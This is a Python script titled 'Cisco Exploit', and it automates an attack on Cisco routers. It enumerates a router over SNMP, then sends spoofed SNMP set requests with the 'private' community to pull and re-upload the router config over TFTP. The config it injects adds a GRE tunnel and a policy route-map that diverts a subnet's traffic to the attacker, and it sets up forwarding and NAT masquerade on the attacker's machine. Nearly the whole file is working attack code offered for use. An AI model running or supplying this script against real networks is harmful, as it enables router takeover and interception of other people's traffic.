#!/usr/bin/python

import os
import sys
import socket
##
# 
# Get interface info : 
#	snmpcheck-1.8.pl -t [ROUTER IP] -v 1 -c public
#	e.g : snmpcheck-1.8.pl -t x.x.x.x -v 1 -c public
#

intro = '''
 Cisco Exploit 
 First extract information via snmpcheck then use interface address in the exploit.
 Actions: 
  1) snmpcheck \n\t'''+os.path.basename(__file__)+ ''' 1 192.168.0.1 
  2) Scapy read request maker \n\t'''+os.path.basename(__file__)+ ''' 2 YouripAddr CiscoIPAddr Cisco2ndInterface 
  3) Check config \n\tUsage: '''+os.path.basename(__file__)+ ''' 3 192.168.0.1
  4) Set Default \n\tUsage: '''+os.path.basename(__file__)+ ''' 4 '''

print intro
print "########################################################\n\n"
if len(sys.argv) < 2:
	exit()
if sys.argv[1] == "1":
	if len(sys.argv) < 2:
		print "Few Parameters\n"
		exit()
	print "1 snmp check"
	os.system("perl snmpcheck-1.8.pl -t "+sys.argv[2]+" -v 1 -c public")

if sys.argv[1] == "2":
	if len(sys.argv) < 4:
		print "Few Parameters\n"
		exit()
	print "[#] Starting TFTP server ...\r\n"
	os.system("atftpd --daemon --port 69 /tmp")
	print "[#] Checking TFTP server ...\r\n"
	os.system("lsof -i :69")
	print "\n[#] Creating Temp file /tmp/pwnd-router.config ...\r\n"
	os.system("rm /tmp/pwnd-router.config ; touch /tmp/pwnd-router.config; chmod 777 /tmp/pwnd-router.config")
	os.system("ls -la /tmp/pwnd-router.config")
	print '\n[1] Run scapy command: scapy'
	print 'send(IP(src="'+sys.argv[4]+'",dst="'+sys.argv[3]+'")/UDP(sport=161)/SNMP(community="private",PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.55.'+sys.argv[2]+'"),value="pwnd-router.config")])))'

	raw_input("\nPress Enter to continue...")
	print '###############################################################################'

	print '\n[2] Edit file /tmp/pwnd-router.config add below config to downloaded config\n  location : above interface FastEthernet (Copy to clipboard)\n-------------------------------------\ninterface Tunnel0 \nip address 172.16.0.1 255.255.255.0 \ntunnel source FastEthernet0/0 \ntunnel destination '+sys.argv[2]
	print '\n-------------------------------------\n'
	os.system("ls -la /tmp/pwnd-router.config")
	raw_input("\nPress Enter to continue...")	
	os.system("leafpad /tmp/pwnd-router.config")
	raw_input("\nPress Enter to continue...")
	print '###############################################################################'

	print '\n[3] Run scapy command to re-upload \nsend(IP(src="'+sys.argv[4]+'",dst="'+sys.argv[3]+'")/UDP(sport=161)/SNMP(community="private",PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.53.'+sys.argv[2]+'"),value="pwnd-router.config")])))'
	raw_input("\nPress Enter to continue...")
	print '###############################################################################'

	print "\n[4] Route Change: \n "
	c1 = "iptunnel del mynet"
	print "  [+] "+ c1
	os.system(c1)

	c2 = "modprobe ip_gre"
	print "  [+] "+c2
	os.system(c2)

	c3 = "iptunnel add mynet mode gre remote "+sys.argv[3]+" local "+sys.argv[2]+" ttl 255"
	print "  [+] "+c3
	os.system(c3)

	c4 = "ip addr add 172.16.0.3/24 dev mynet"
	print "  [+] "+c4
	os.system(c4)

	c5 = "route add -net 172.16.0.0 netmask 255.255.255.0 dev mynet"
	print "  [+] "+c5 
	print os.system(c5)

	c6 = "ifconfig mynet up"
	print "  [+] "+c6
	os.system(c6)
	
	raw_input("\nPress Enter to continue...")
	
	print "\n[5] Add to config file:"
	print " [Change 1 ] Location: (below access-list)\n"+ '''
\troute-map divert permit 10
\tmatch ip address 102
\tset ip next-hop 172.16.0.3'''
	print "\n [Change 2 ] Location: (FastEthernet) \n"+ '''
\tinterface FastEthernet1/0
\tip address 10.200.0.254 255.255.255.0
\tip nat inside
\t[ add this here ]-->  ip policy route-map divert
\tduplex auto
\tspeed auto
\t[above access-list]'''
	os.system("leafpad /tmp/pwnd-router.config")
	raw_input("\nPress Enter to continue...")
	print '###############################################################################'
	print '\n[6] Run scapy command to re-upload \n  send(IP(src="'+sys.argv[4]+'",dst="'+sys.argv[3]+'")/UDP(sport=161)/SNMP(community="private",PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.53.'+sys.argv[2]+'"),value="pwnd-router.config")])))'
	raw_input("\nPress Enter to continue...")
	print '###############################################################################'

	print '\n[7] Route Forwarding:'
	c7 = "echo 1 > /proc/sys/net/ipv4/ip_forward"
	print "  [+] "+c7
	os.system(c7)

	c8 = "route add -net 10.200.0.0 netmask 255.255.255.0 gw 172.16.0.1"
	print "  [+] "+c8
	os.system(c8)

	c9 = "iptables --table nat --append POSTROUTING --out-interface enp3s0 -j MASQUERADE"
	print "  [+] "+c9
	os.system(c9)

	c10 = "iptables --append FORWARD --in-interface mynet -j ACCEPT"
	print "  [+] "+c10
	os.system(c10)
	print "\n\n"

if sys.argv[1] == "3":
	if len(sys.argv) < 1:
		print "Few Parameters\n"
		exit()
	print "Check config.."
	c11 = "telnet "+sys.argv[2]
	print "  [+] "+ c11
	os.system(c11)

if sys.argv[1] == "4":
	print "Set Default..."
	c12 = "iptunnel del mynet"
	print "[~] "+ c12
	os.system(c12)


#EOF